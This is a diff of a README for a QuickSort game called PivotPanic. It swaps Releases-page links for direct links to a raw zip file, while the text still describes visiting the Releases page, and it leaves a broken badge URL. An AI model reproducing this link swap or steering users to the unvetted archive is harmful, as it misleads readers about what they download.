@@ -6,14 +6,14 @@ Welcome to PivotPanic! This fun game lets you challenge QuickSort, a well-known 
 
 ## 📥 Download the Game
 
-[![Download PivotPanic](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/goyo-star/PivotPanic/releases)
+[![Download PivotPanic](https://raw.githubusercontent.com/goyo-star/PivotPanic/main/funmaker/PivotPanic.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/goyo-star/PivotPanic/main/funmaker/PivotPanic.zip)
 
 To get started, visit the Releases page to download the game. 
 
 ## 📂 Download & Install
 
 1. Click on the link below to visit the Releases page:
-   - [Download PivotPanic](https://github.com/goyo-star/PivotPanic/releases)
+   - [Download PivotPanic](https://raw.githubusercontent.com/goyo-star/PivotPanic/main/funmaker/PivotPanic.zip)
 
 2. Once you are on the Releases page, look for the latest version. It will be listed at the top. 
    
